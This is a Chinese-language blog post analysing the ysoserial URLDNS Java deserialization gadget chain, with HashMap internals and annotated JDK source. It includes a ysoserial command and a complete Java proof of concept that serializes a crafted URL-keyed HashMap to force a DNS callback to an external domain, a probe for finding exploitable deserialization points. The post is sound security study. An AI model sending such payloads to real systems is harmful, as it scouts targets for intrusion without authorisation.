<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_firNbek6HK4hIGMez2TYQ)

前言 gadget 分析    触发过程    POC 测试代码    HashMap        HashMap 的原理        设置新键值对        读取 key 的 value    反序列化过程        HashMap 序列化过程        HashMap 反序列化过程 jdk1.8 与 jdk1.7u80 调用路线回看 payload 生成关键参考资料

前言
--

`URLDNS`是`ysoserial`中最简单的 gadget，**利用它可以判断是否存在反序列化点**。

如果目标服务器存在反序列化动作（readObject），处理了我们的输入，同时按照我们给定的 URL 地址完成了 DNS 查询，我们就可以确认是存在反序列化利用点的。

同时因为**这个利用链不依赖任何第三方库**，没有什么限制。

yso 用法命令：

`java -jar ysoserial-master-30099844c6-1.jar URLDNS "http://urldns.f9znici4.3cm.pw"`

gadget 分析
---------

### 触发过程

```
Gadget Chain:
  HashMap.readObject()
      HashMap.putVal()
          HashMap.hash()
              URL.hashCode()

```

### POC 测试代码

```
package com.example;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
   public static void main(String[] args) throws Exception {
       // 0x01. 生成payload
       // 设置一个hashMap
       HashMap<URL, String> hashmap = new HashMap<URL, String>();
       // 设置可以接收DNS查询的地址
       URL url = new URL("http://urldns.f9znici4.3cm.pw");
       //将URL的hashCode字段设置为允许修改
       Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
       f.setAccessible(true);

       // 1. 设置url的hashCode字段为任意值
       f.set(url, 0x1234);// 这样操作是为了不在HashMap.put中触发URLDNS查询，如果不这么写就会触发两次
       // 2. 将url放入hashmap中
       hashmap.put(url, "adsf");
       // 修改url的的hashCode字段为-1，为了触发DNS查询
       f.set(url, -1);

       // 0x02. 写入文件模拟网络传输
       ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns.ser"));
       oos.writeObject(hashmap);

       //0x03. 读取文件，进行反序列化触发payload
       ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns.ser"));
       ois.readObject();
  }
}

```

运行后，反序列化操作（readObject）后，可以看到有 DNS 请求：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XWGnvVkmc9XWZYJiaS59AXGbxQCyndicXl50zyb5jWPWBnwjmjRKdnCqN28OVw6hrLrJS1sJCicC1ZCQ/640?wx_fmt=png)

从 payload 结构可以看到，有三个主要的名词：`HashMap`、`URL`、`HashCode`

最终的 payload 结构是：一个`HashMap`，里面包含了 一个修改了`HashCode`为`-1`的`URL`类

我们可以选择在`HashMap`的`readObject`处下断点进行调试。

### HashMap

#### HashMap 的原理

HashMap 是一种数据结构，本质在使用上是存取 key-value 键值对的使用方式，但在实现上引入了 **key 值的 hash 映射到一维数组**的形式，再引入链表来解决 hash 碰撞问题（不同 key 映射到数组同一位置）。

#### 设置新键值对

1.  计算 key 的 hash：`Hash(k)`
    
2.  通过 Hash(k) 映射到**有限的数组 a** 的位置 i
    
3.  在 a[i] 的位置存入 value
    
4.  因为把计算出来的不同的 key 的 hash 映射到有限的数组长度，肯定会出现不同的 key 对应同一个数组位置 i 的情况。如果发现 a[i] 已经有了其他 key 的 value，就放入这个 i 位置后面对应的链表（根据多少的情况可能变为树）中。
    

#### 读取 key 的 value

1.  计算 key 的 hash：`Hash(k)`
    
2.  通过 Hash(k) 映射到有限的数组 a 的位置 i
    
3.  读取在 a[i] 的位置的 value
    
4.  如果发现 a[i] 已经有了其他 key 的 value，就遍历这个 i 位置后面对应的链表（根据多少的情况可能变为树），去查找这个 key 再去取值。
    

### 反序列化过程

#### HashMap 序列化过程

`java.util.HashMap#writeObject`分为三个步骤进行序列化：

1.  序列化写入一维数组的长度
    
2.  序列化写入键值对的个数
    
3.  序列化写入键值对的键和值
    

```
private void writeObject(java.io.ObjectOutputStream s)
   throws IOException {
   int buckets = capacity();
   // Write out the threshold, loadfactor, and any hidden stuff
   s.defaultWriteObject();
   s.writeInt(buckets);
   s.writeInt(size);
   internalWriteEntries(s);
}

```

#### HashMap 反序列化过程

`java.util.HashMap#readObject`：

```
private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException
  {
       //...省略代码...
       //读取一维数组长度，不处理
       //读取键值对个数mappings
       //处理其他操作并初始化
   
       //遍历反序列化分辨读取key和value
       for (int i = 0; i < mappings; i++) {
           //URL类也有readObject方法，此处也会执行，但是DNS查询行为不在这，我们跳过
               K key = (K) s.readObject();
               V value = (V) s.readObject();
           //注意以下这句话
           putVal(hash(key), key, value, false, false);
      }
  }

```

`putVal`是往 HashMap 中**放入键值对**的方法，上面也说到在放入时会计算 **key 的 hash** 作为转化为数组位置 **i** 的映射依据。

**而 DNS 查询正是在计算 URL 类的对象的 hash 的过程中触发的**，即 hash(key)。

`java.util.HashMap#hash`：

```
static final int hash(Object key) {
   int h;
   return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}

```

注意这里的参数`key`是是 hashmap 对象的 key（从序列化的数据中来），即传入的 key 是一个 URL 对象。这里的`key.hashCode()`调用的是`URL`类的`hashCode`方法。

`java.net.URL#hashCode`：

```
   transient URLStreamHandler handler; //这个URL传输实现类是一个transient临时类型，它不会被反序列化（之后会用到）
   private int hashCode = -1;//hashCode是private类型，需要手动开放控制权才可以修改。要用反射修改下值
   //...

   public synchronized int hashCode() {
       //判断如果当前对象中的hashCode不为默认值-1的话，就直接返回
       //意思就是如果以前算过了就别再算了
       if (hashCode != -1)
           return hashCode;
       //如果没算过，就调用当前URL类的URL传输实现类去计算hashcode
       hashCode = handler.hashCode(this);//进入此处
       return hashCode;
  }

```

`java.net.URLStreamHandler#hashCode`：

```
   // 次出传入的对象为this，即URL，我们先前设置的URL的值
   protected int hashCode(URL u) {
       int h = 0;// 计算的hash的结果

       // Generate the protocol part.
       // 使用url的协议部分，计算hash
       String protocol = u.getProtocol();
       if (protocol != null)
           h += protocol.hashCode();

       // Generate the host part.
       // **通过url获取目标IP地址**（关键），再计算hash并拼接。**这个过程就会发出DNS查询请求**
       InetAddress addr = getHostAddress(u);
       if (addr != null) {
           h += addr.hashCode();
      } else {// 如果没有获取到域名对应的IP，就直接把域名计算hash并拼接
           String host = u.getHost();
           if (host != null)
               h += host.toLowerCase().hashCode();
      }
   // ...

```

如此，`getHostAddress(u)`这一关键语句，通过我们提供的 URL 地址去获取对应的 IP。

jdk1.8 与 jdk1.7u80 调用路线
-----------------------

`jdk1.8`：

1.  HashMap->readObject()
    
2.  HashMap->hash()
    
3.  URL->hashCode()
    
4.  URLStreamHandler->hashCode()
    
5.  URLStreamHandler->getHostAddress()
    
6.  InetAddress->getByName()
    

`jdk1.7u80`：

1.  HashMap->readObject()
    
2.  **HashMap->putForCreate()**
    
3.  HashMap->hash()
    
4.  URL->hashCode()
    
5.  之后相同
    

回看 payload 生成关键
---------------

1.  HashMap 对象中有一个 **key 为 URL 对象**的键值对
    
2.  这个 URL 对象的 **hashcode 需要为 - 1**
    

参考资料
----

JAVA 反序列化 - ysoserial-URLDNS

ysoserial payload 分析